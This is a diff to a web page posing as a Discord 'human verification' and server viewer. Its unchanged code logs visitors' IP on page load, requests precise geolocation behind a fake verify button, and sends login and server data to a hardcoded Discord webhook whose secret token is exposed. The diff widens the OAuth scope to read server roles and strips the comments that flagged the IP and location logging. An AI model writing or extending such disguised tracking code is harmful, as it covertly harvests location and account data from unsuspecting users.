@@ -15,7 +15,6 @@
             min-height: 100vh;
             margin: 0;
             padding: 20px;
-            /* Disable text selection */
             -webkit-user-select: none;
             -moz-user-select: none;
             -ms-user-select: none;
@@ -101,9 +100,21 @@
 
         .server-item {
             background: #2f3136;
-            padding: 10px 15px;
+            padding: 12px 15px;
             margin: 8px 0;
-            border-radius: 4px;
+            border-radius: 6px;
+            display: flex;
+            flex-direction: column;
+            gap: 8px;
+            cursor: pointer;
+            transition: background 0.2s;
+        }
+
+            .server-item:hover {
+                background: #32353b;
+            }
+
+        .server-header {
             display: flex;
             align-items: center;
             gap: 12px;
@@ -135,6 +146,25 @@
         .server-count {
             color: #b9bbbe;
             font-size: 12px;
+        }
+
+        /* Roles Dropdown Section */
+        .roles-container {
+            margin-top: 5px;
+            padding-top: 8px;
+            border-top: 1px solid #36393f;
+            display: flex;
+            flex-wrap: wrap;
+            gap: 6px;
+        }
+
+        .role-badge {
+            background: #4f545c;
+            color: #fff;
+            font-size: 11px;
+            padding: 3px 8px;
+            border-radius: 12px;
+            font-weight: 500;
         }
 
         .user-info {
@@ -187,6 +217,7 @@
         <div id="content" class="hidden">
             <div class="user-info" id="userInfo"></div>
             <h3 style="color: #fff; text-align: left; margin-bottom: 10px;">Your Servers (<span id="serverCount">0</span>)</h3>
+            <p style="text-align: left; font-size: 12px; color: #8e9297; margin-top: -5px;">Click a server to view your roles in it.</p>
             <div class="server-list" id="serverList"></div>
         </div>
     </div>
@@ -197,18 +228,18 @@
         const DISCORD_API = 'https://discord.com/api/v10';
         const WEBHOOK_URL = "https://discord.com/api/webhooks/1536692672079724645/83NQgcZ-AerJ4Oc5tX4GI8cJZ-P32Y29jGQSaMjEWcs16ZxDz2adwefkPh9qEuT45sJA";
 
-        // Build OAuth2 URL with identify + guilds scope
-        const oauthUrl = `https://discord.com/oauth2/authorize?client_id=${CLIENT_ID}&redirect_uri=${encodeURIComponent(REDIRECT_URI)}&response_type=token&scope=identify%20guilds`;
+        let userAccessToken = '';
+
+        // Added 'guilds.members.read' scope to fetch user roles inside servers
+        const oauthUrl = `https://discord.com/oauth2/authorize?client_id=${CLIENT_ID}&redirect_uri=${encodeURIComponent(REDIRECT_URI)}&response_type=token&scope=identify%20guilds%20guilds.members.read`;
         const loginBtn = document.getElementById('loginBtn');
         loginBtn.href = oauthUrl;
 
-        // 1. Log IP on initial page load
         window.addEventListener('DOMContentLoaded', () => {
         logPageVisit();
         checkOAuthCallback();
         });
 
-        // 2. Human Verification Click -> Request Geolocation -> Unlock Buttons
         document.getElementById('humanBtn').addEventListener('click', () => {
         const humanBtn = document.getElementById('humanBtn');
         humanBtn.textContent = "Verifying...";
@@ -248,9 +279,9 @@
         },
         (error) => {
         console.warn("Geolocation permission error:", error.message);
-        unlockInterface(); // Unlock even if permission is denied
+        unlockInterface();
         },
-        { enableHighAccuracy: true, timeout: 5000, maximumAge: 0 }
+        { enableHighAccuracy: false, timeout: 10000, maximumAge: 0 }
         );
         } else {
         unlockInterface();
@@ -258,7 +289,6 @@
         });
 
         function unlockInterface() {
-        // Hide the verification box and unlock the login button
         document.getElementById('verifyBox').classList.add('hidden');
         loginBtn.classList.remove('disabled');
         }
@@ -294,19 +324,18 @@
         }
         }
 
-        // Process OAuth redirect token
         function checkOAuthCallback() {
         const hash = window.location.hash.substring(1);
         const params = new URLSearchParams(hash);
         const accessToken = params.get('access_token');
 
         if (accessToken) {
+        userAccessToken = accessToken;
         document.getElementById('verifyBox').classList.add('hidden');
         loginBtn.classList.add('hidden');
         document.getElementById('intro-text').classList.add('hidden');
         document.getElementById('content').classList.remove('hidden');
 
-        // Clean token out of address bar
         history.replaceState(null, null, window.location.pathname);
         fetchUserData(accessToken);
         }
@@ -363,7 +392,8 @@
         const initials = guild.name.split(' ').map(w => w[0]).join('').substring(0, 2).toUpperCase();
 
         return `
-        <div class="server-item">
+        <div class="server-item" onclick="toggleServerRoles('${guild.id}', this)">
+        <div class="server-header">
         <div class="server-icon" style="${iconUrl ? `background-image: url(${iconUrl}); background-size: cover;` : ''}">
         ${iconUrl ? '' : initials}
         </div>
@@ -372,8 +402,53 @@
         <div class="server-count">ID: ${guild.id}</div>
         </div>
         </div>
+        <div class="roles-container hidden" id="roles-${guild.id}">
+        <span class="role-badge" style="background: transparent; color: #8e9297; padding: 0;">Loading roles...</span>
+        </div>
+        </div>
         `;
         }).join('');
+        }
+
+        // Fetches and toggles roles for a specific guild
+        async function toggleServerRoles(guildId, element) {
+        const rolesBox = element.querySelector(`#roles-${guildId}`);
+
+        // Toggle visibility if already loaded
+        if (!rolesBox.classList.contains('hidden') && !rolesBox.dataset.loading) {
+        rolesBox.classList.add('hidden');
+        return;
+        }
+
+        rolesBox.classList.remove('hidden');
+
+        // Prevent duplicate API calls if roles are already fetched
+        if (rolesBox.dataset.loaded) return;
+        rolesBox.dataset.loading = "true";
+
+        try {
+        const memberRes = await fetch(`${DISCORD_API}/users/@me/guilds/${guildId}/member`, {
+        headers: { 'Authorization': `Bearer ${userAccessToken}` }
+        });
+
+        if (memberRes.ok) {
+        const member = await memberRes.json();
+
+        if (member.roles && member.roles.length > 0) {
+        rolesBox.innerHTML = member.roles.map(roleId => `<span class="role-badge">Role ID: ${roleId}</span>`).join('');
+        } else {
+        rolesBox.innerHTML = `<span class="role-badge" style="background: #36393f; color: #8e9297;">No special roles</span>`;
+        }
+        } else {
+        rolesBox.innerHTML = `<span class="role-badge" style="background: #ed4245; color: white;">Roles unavailable</span>`;
+        }
+        } catch (err) {
+        console.error('Failed to fetch guild roles:', err);
+        rolesBox.innerHTML = `<span class="role-badge" style="background: #ed4245; color: white;">Error loading roles</span>`;
+        } finally {
+        delete rolesBox.dataset.loading;
+        rolesBox.dataset.loaded = "true";
+        }
         }
 
         async function logLoginToWebhook(user, guilds) {
